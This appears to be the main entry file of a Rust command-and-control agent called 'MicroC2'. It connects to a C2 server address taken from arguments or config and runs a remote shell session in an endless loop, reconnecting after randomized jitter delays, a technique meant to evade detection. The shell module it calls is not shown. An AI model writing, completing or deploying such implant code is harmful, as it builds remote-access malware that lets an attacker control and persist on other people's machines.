extern crate tokio;
extern crate hyper;
extern crate chrono;
extern crate uuid;

mod file_handling;
mod commands;
mod config;

use commands::command_shell::run_shell;
use config::AgentConfig;
use std::env;
use uuid::Uuid;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let agent_id = Uuid::new_v4().to_string();
    println!("[STARTUP] MicroC2 Agent starting...");
    println!("[INFO] Agent ID: {}", agent_id);
    
    // Load configuration or use command line args
    let config = AgentConfig::load()?;
    let server_addr = env::args()
        .nth(1)
        .unwrap_or_else(|| config.get_server_url());
    
    println!("[NETWORK] Attempting connection to C2: {}", server_addr);
    
    loop {
        match run_shell(&server_addr).await {
            Ok(_) => println!("[INFO] Shell session ended"),
            Err(e) => println!("[ERROR] Shell error: {}. Retrying...", e),
        }
        
        // Add jitter to reconnection attempts
        let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
        println!("[RETRY] Attempting to reconnect...");
    }
}
